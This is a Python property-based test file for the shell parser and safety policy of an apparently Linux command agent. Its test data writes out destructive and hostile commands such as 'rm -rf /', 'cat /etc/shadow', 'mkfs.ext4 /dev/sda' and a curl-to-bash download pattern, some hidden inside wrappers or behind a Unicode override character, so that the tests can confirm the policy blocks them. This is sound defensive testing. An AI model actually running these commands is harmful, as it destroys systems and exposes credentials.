"""Property-based shell parser and policy stability tests."""

from __future__ import annotations

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from linuxagent.interfaces import CommandSource, SafetyLevel
from linuxagent.policy import DEFAULT_POLICY_ENGINE
from linuxagent.policy.shell_structure import analyze_shell_structure

_LEVEL_RANK = {
    SafetyLevel.SAFE: 0,
    SafetyLevel.CONFIRM: 1,
    SafetyLevel.BLOCK: 2,
}

_SHELLISH_TEXT = st.text(
    alphabet=st.characters(
        blacklist_categories=("Cs",),
        blacklist_characters=("\r",),
    ),
    max_size=512,
)

_PIPELINE_HEADS = st.sampled_from(("echo ok", "curl https://example.test/payload.sh", "printf x"))
_PIPELINE_TAILS = st.sampled_from(("cat", "bash", "sh", "grep x"))
_REDIRECT_OPS = st.sampled_from((">", ">>", "2>", "&>"))
_REDIRECT_TARGETS = st.sampled_from(
    ("var/linuxagent-out", "/etc/cron.d/linuxagent", "relative.txt")
)
_BLOCK_PAYLOADS = st.sampled_from(("rm -rf /", "cat /etc/shadow", "mkfs.ext4 /dev/sda"))
_BLOCK_WRAPPERS = st.sampled_from(
    (
        "{}",
        "bash -c '{}'",
        "sh -c '{}'",
        "echo ignored | {}",
        "({})",
        "$({})",
    )
)


@settings(
    max_examples=200,
    deadline=None,
    suppress_health_check=(HealthCheck.too_slow,),
)
@given(_SHELLISH_TEXT)
def test_shell_structure_fuzz_never_raises(command: str) -> None:
    structure = analyze_shell_structure(command)

    assert structure.parse_error is None or structure.parse_error
    assert len(structure.child_commands) == len(set(structure.child_commands))
    assert all(child.strip() == child for child in structure.child_commands)


@settings(max_examples=80, deadline=None)
@given(_PIPELINE_HEADS, _PIPELINE_TAILS)
def test_pipeline_facts_keep_segment_invariants(left: str, right: str) -> None:
    command = f"{left} | {right}"
    structure = analyze_shell_structure(command)

    assert structure.parse_error is None
    assert structure.pipeline_segments == (left, right)
    assert "|" in structure.control_operators
    assert left in structure.child_commands
    assert right in structure.child_commands


@settings(max_examples=80, deadline=None)
@given(_REDIRECT_OPS, _REDIRECT_TARGETS)
def test_redirect_facts_keep_target_invariants(operator: str, target: str) -> None:
    structure = analyze_shell_structure(f"echo ok {operator} {target}")

    assert structure.parse_error is None
    assert len(structure.redirects) == 1
    assert structure.redirects[0].operator in operator
    assert structure.redirects[0].target == target
    assert structure.redirects[0].is_write is True


@settings(max_examples=80, deadline=None)
@given(_BLOCK_PAYLOADS, _BLOCK_WRAPPERS)
def test_recursive_policy_fuzz_does_not_downgrade_block(payload: str, wrapper: str) -> None:
    command = wrapper.format(payload)
    baseline = DEFAULT_POLICY_ENGINE.evaluate(payload)
    decision = DEFAULT_POLICY_ENGINE.evaluate(command, source=CommandSource.USER)

    assert baseline.level is SafetyLevel.BLOCK
    assert _LEVEL_RANK[decision.level] >= _LEVEL_RANK[baseline.level]


@pytest.mark.parametrize(
    "command",
    [
        "echo $(systemctl restart nginx",
        "echo `systemctl restart nginx",
        "echo ok >",
        "echo \u202erm -rf /",
        "printf 'unterminated",
    ],
)
def test_parser_failures_become_explicit_policy_decisions(command: str) -> None:
    decision = DEFAULT_POLICY_ENGINE.evaluate(command, source=CommandSource.USER)

    assert decision.level is SafetyLevel.BLOCK
    assert decision.matched_rule in {"PARSE_ERROR", "INPUT_VALIDATION"}
